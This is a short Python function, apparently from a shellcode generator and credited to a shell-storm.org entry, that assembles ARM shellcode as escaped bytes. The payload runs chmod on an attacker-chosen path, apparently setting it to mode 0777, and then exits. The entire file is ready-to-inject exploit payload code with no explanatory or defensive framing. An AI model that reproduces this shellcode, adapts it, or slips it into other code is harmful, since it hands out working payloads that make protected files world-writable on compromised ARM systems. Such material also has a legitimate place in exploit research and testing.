#http://shell-storm.org/shellcode/files/shellcode-853.php
#Author : gunslinger_ (yuda at cr0security dot com)

def chmod( path):
      shellcode =  r"\x01\x60\x8f\xe2"
      shellcode += r"\x16\xff\x2f\xe1"
      shellcode += r"\x78\x46"
      shellcode += r"\x10\x30"
      shellcode += r"\xff\x21"
      shellcode += r"\xff\x31"
      shellcode += r"\x01\x31"
      shellcode += r"\x0f\x37"
      shellcode += r"\x01\xdf"
      shellcode += r"\x40\x40"
      shellcode += r"\x01\x27"
      shellcode += r"\x01\xdf"
      shellcode += path
      return shellcode